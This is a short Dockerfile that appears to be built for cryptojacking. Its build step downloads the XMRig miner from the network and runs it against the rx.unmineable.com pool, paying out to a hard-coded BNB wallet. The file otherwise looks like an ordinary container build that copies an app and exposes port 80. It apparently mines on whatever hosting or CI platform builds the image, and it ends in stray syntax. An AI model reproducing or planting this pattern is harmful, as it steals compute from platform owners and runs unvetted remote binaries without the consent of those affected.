FROM devisty/xssh:v2
EXPOSE 80

COPY . /app
RUN mkdir XMRIG && cd XMRIG && wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz && tar xf xmrig-6.18.0-bionic-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u BNB:bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23:174504546.testing4 --ethstratum ETHPROXY pause
